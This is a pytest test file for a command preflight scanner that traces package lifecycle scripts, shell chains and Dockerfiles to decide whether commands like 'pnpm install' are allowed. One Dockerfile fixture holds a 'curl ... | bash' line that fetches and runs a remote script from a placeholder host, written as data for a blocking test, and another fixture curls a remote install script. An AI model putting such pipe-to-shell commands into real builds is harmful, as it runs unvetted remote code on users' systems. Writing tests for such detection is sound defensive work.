from pathlib import Path

import pytest

from codex_preflight_core.command.classifier import classify_command
from codex_preflight_core.preflight import run_preflight
from codex_preflight_core.reachability.resolver import build_execution_graph
from codex_preflight_core.report.markdown_renderer import render_markdown_report


def write_file(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def rule_ids(graph) -> list[str]:
    return [finding.rule_id for finding in graph.to_findings()]


def test_execution_graph_records_nodes_and_edges_for_package_lifecycle_node_script(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node scripts/setup.js"}}')
    write_file(tmp_path / "scripts" / "setup.js", "const cp = require('child_process'); cp.exec('echo static');\n")

    graph = build_execution_graph(tmp_path, "pnpm install", classify_command("pnpm install"))

    report = graph.to_report()
    assert report["entryCommand"] == "pnpm install"
    assert any(node["label"] == "package.json scripts.postinstall" for node in report["nodes"])
    assert any(node["file"] == "scripts/setup.js" for node in report["nodes"])
    assert any(edge["reason"] == "lifecycle script invokes local script" for edge in report["edges"])
    assert "JS_CHILD_PROCESS_EXEC" in rule_ids(graph)


def test_resolver_uses_node_package_script_helper(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node scripts/setup.js"}}')
    calls = []

    def fake_package_scripts(package_file: Path, names: set[str], text: str | None = None, **kwargs):
        calls.append((package_file, names, text))
        return []

    monkeypatch.setattr(
        "codex_preflight_core.reachability.node_package.package_scripts",
        fake_package_scripts,
    )

    build_execution_graph(tmp_path, "pnpm install", classify_command("pnpm install"))

    assert calls
    assert calls[0][0] == Path("package.json")
    assert "postinstall" in calls[0][1]
    assert calls[0][2] is not None


def test_package_lifecycle_shell_script_indirection_is_reachable(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "bash scripts/install.sh"}}')
    write_file(tmp_path / "scripts" / "install.sh", "source scripts/common.sh\n")
    write_file(tmp_path / "scripts" / "common.sh", "echo static\n")

    graph = build_execution_graph(tmp_path, "npm install", classify_command("npm install"))

    assert "SCRIPT_INDIRECT_EXECUTION" in rule_ids(graph)
    assert "SHELL_SOURCE_INDIRECTION" in rule_ids(graph)
    assert any(node.file == Path("scripts/common.sh") for node in graph.nodes)


def test_python_network_and_subprocess_capabilities_are_detected(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "python scripts/setup.py"}}')
    write_file(
        tmp_path / "scripts" / "setup.py",
        "import subprocess, urllib.request\nsubprocess.run(['echo', 'static'])\nurllib.request.urlopen('https://example.invalid')\n",
    )

    graph = build_execution_graph(tmp_path, "yarn install", classify_command("yarn install"))

    assert "PYTHON_SUBPROCESS_EXEC" in rule_ids(graph)
    assert "PYTHON_NETWORK_ACCESS" in rule_ids(graph)


def test_missing_script_target_in_dependency_install_becomes_ask_user(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node scripts/missing.js"}}')

    report = run_preflight(tmp_path, "pnpm install", use_cache=False)

    assert report["decision"] == "ASK_USER"
    assert "executionGraph" in report
    assert [finding["ruleId"] for finding in report["findings"]] == [
        "NODE_POSTINSTALL_SCRIPT",
        "SCRIPT_INDIRECT_EXECUTION",
        "SCRIPT_TARGET_MISSING",
    ]


def test_package_install_reaching_child_process_is_not_allowed(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node scripts/setup.js"}}')
    write_file(tmp_path / "scripts" / "setup.js", "child_process.exec('echo static')\n")

    report = run_preflight(tmp_path, "pnpm install", use_cache=False)

    assert report["decision"] in {"ASK_USER", "BLOCK"}
    assert "JS_CHILD_PROCESS_EXEC" in [finding["ruleId"] for finding in report["findings"]]


def test_unknown_interpreter_in_dependency_install_becomes_ask_user(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "custom-runner scripts/setup.txt"}}')

    report = run_preflight(tmp_path, "pnpm install", use_cache=False)

    assert report["decision"] == "ASK_USER"
    assert any(finding["ruleId"] == "SCRIPT_UNKNOWN_INTERPRETER" for finding in report["findings"])


def test_chain_depth_exceeded_uncertainty_is_reported(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "bash scripts/one.sh"}}')
    chain = ["one", "two", "three", "four", "five", "six", "seven"]
    for current, nxt in zip(chain, chain[1:], strict=False):
        write_file(tmp_path / "scripts" / f"{current}.sh", f"bash scripts/{nxt}.sh\n")
    write_file(tmp_path / "scripts" / "seven.sh", "echo static\n")

    graph = build_execution_graph(tmp_path, "pnpm install", classify_command("pnpm install"))

    assert "SCRIPT_CHAIN_DEPTH_EXCEEDED" in rule_ids(graph)


def test_wide_fanout_node_budget_exhaustion_is_explicit_uncertainty(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "bash scripts/entry.sh"}}')
    fanout_lines = []
    for index in range(120):
        target = tmp_path / "scripts" / f"leaf-{index:03}.sh"
        write_file(target, "echo static\n")
        fanout_lines.append(f"bash scripts/leaf-{index:03}.sh")
    write_file(tmp_path / "scripts" / "tail.sh", "curl https://example.invalid/install.sh\n")
    fanout_lines.append("bash scripts/tail.sh")
    write_file(tmp_path / "scripts" / "entry.sh", "\n".join(fanout_lines) + "\n")

    report = run_preflight(tmp_path, "pnpm install", use_cache=False)

    assert report["decision"] == "ASK_USER"
    assert "SCRIPT_NODE_BUDGET_EXCEEDED" in [finding["ruleId"] for finding in report["findings"]]
    uncertainties = report["executionGraph"]["uncertainties"]
    assert any(item["ruleId"] == "SCRIPT_NODE_BUDGET_EXCEEDED" for item in uncertainties)


def test_docker_compose_reaches_referenced_dockerfile(tmp_path: Path) -> None:
    write_file(tmp_path / "services" / "api" / "compose.yml", "services:\n  app:\n    build:\n      context: .\n")
    write_file(tmp_path / "services" / "api" / "Dockerfile", "RUN curl https://example.invalid/install.sh | bash\n")

    report = run_preflight(tmp_path, "docker compose up", use_cache=False)

    assert report["decision"] == "BLOCK"
    assert any(finding["ruleId"] == "DOCKER_REACHABLE_RUN_REMOTE_EXEC" for finding in report["findings"])


def test_report_json_and_markdown_include_execution_chain(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node scripts/setup.js"}}')
    write_file(tmp_path / "scripts" / "setup.js", "fetch('https://example.invalid/status')\n")

    report = run_preflight(tmp_path, "pnpm install", use_cache=False)
    markdown = render_markdown_report(report)

    assert report["executionGraph"]["entryCommand"] == "pnpm install"
    assert any(capability["ruleId"] == "JS_NETWORK_ACCESS" for capability in report["executionGraph"]["capabilities"])
    assert "## Execution Chain" in markdown
    assert "package.json scripts.postinstall" in markdown
    assert "JS_NETWORK_ACCESS" in markdown


def test_safe_readonly_command_stays_low_risk(tmp_path: Path) -> None:
    write_file(tmp_path / "README.md", "hello\n")

    report = run_preflight(tmp_path, "git status", use_cache=False)

    assert report["decision"] == "ALLOW"
    assert report["executionGraph"]["nodes"]
    assert report["executionGraph"]["capabilities"] == []
    assert report["executionGraph"]["uncertainties"] == []


def test_reachability_skips_fixture_marker_directories(tmp_path: Path) -> None:
    fixture = tmp_path / "fixtures"
    write_file(fixture / ".codex-preflight-fixtures", "")
    write_file(fixture / "package.json", '{"scripts": {"postinstall": "node scripts/setup.js"}}')
    write_file(fixture / "scripts" / "setup.js", "child_process.exec('echo static')\n")

    graph = build_execution_graph(tmp_path, "pnpm install", classify_command("pnpm install"))

    assert "JS_CHILD_PROCESS_EXEC" not in rule_ids(graph)
    assert not any(node.file == Path("fixtures/package.json") for node in graph.nodes)


def test_oversized_reachable_target_is_uncertain_not_scanned(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("codex_preflight_core.reachability.resolver.REACHABILITY_MAX_FILE_SIZE", 64)
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node scripts/large.js"}}')
    write_file(tmp_path / "scripts" / "large.js", "child_process.exec('echo static')\n" + ("a" * 128))

    graph = build_execution_graph(tmp_path, "pnpm install", classify_command("pnpm install"))

    assert "SCRIPT_PARSE_UNCERTAIN" in rule_ids(graph)
    assert "JS_CHILD_PROCESS_EXEC" not in rule_ids(graph)


def test_binary_reachable_target_is_uncertain_not_scanned(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node scripts/binary.js"}}')
    write_file(tmp_path / "scripts" / "binary.js", "child_process.exec('echo static')\n\x00")

    graph = build_execution_graph(tmp_path, "pnpm install", classify_command("pnpm install"))

    assert "SCRIPT_PARSE_UNCERTAIN" in rule_ids(graph)
    assert "JS_CHILD_PROCESS_EXEC" not in rule_ids(graph)


def test_outside_reachable_target_is_not_scanned(tmp_path: Path) -> None:
    outside = tmp_path.parent / "outside.js"
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node ../outside.js"}}')
    write_file(outside, "child_process.exec('echo static')\n")

    graph = build_execution_graph(tmp_path, "pnpm install", classify_command("pnpm install"))

    assert "SCRIPT_TARGET_OUTSIDE_REPO" in rule_ids(graph)
    assert "JS_CHILD_PROCESS_EXEC" not in rule_ids(graph)


def test_reachable_symlink_target_is_uncertain_not_scanned(tmp_path: Path) -> None:
    write_file(tmp_path / "package.json", '{"scripts": {"postinstall": "node scripts/link.js"}}')
    write_file(tmp_path / "real.js", "child_process.exec('echo static')\n")
    link = tmp_path / "scripts" / "link.js"
    link.parent.mkdir(parents=True, exist_ok=True)
    try:
        link.symlink_to(tmp_path / "real.js")
    except OSError as error:
        pytest.skip(f"symlink creation is unavailable: {error}")

    graph = build_execution_graph(tmp_path, "pnpm install", classify_command("pnpm install"))

    assert "SCRIPT_PARSE_UNCERTAIN" in rule_ids(graph)
    assert "JS_CHILD_PROCESS_EXEC" not in rule_ids(graph)


@pytest.mark.parametrize(
    ("command", "script_name"),
    [
        ("npm test", "test"),
        ("npm start", "start"),
        ("npm build", "build"),
    ],
)
def test_npm_shorthand_commands_reach_package_scripts(
    tmp_path: Path,
    command: str,
    script_name: str,
) -> None:
    write_file(
        tmp_path / "package.json",
        f'{{"scripts": {{"{script_name}": "node scripts/{script_name}.js"}}}}',
    )
    write_file(tmp_path / "scripts" / f"{script_name}.js", "child_process.exec('echo static')\n")

    report = run_preflight(tmp_path, command, use_cache=False)

    assert report["decision"] in {"ASK_USER", "BLOCK"}
    assert "JS_CHILD_PROCESS_EXEC" in [finding["ruleId"] for finding in report["findings"]]
    assert any(
        node["label"] == f"package.json scripts.{script_name}"
        for node in report["executionGraph"]["nodes"]
    )
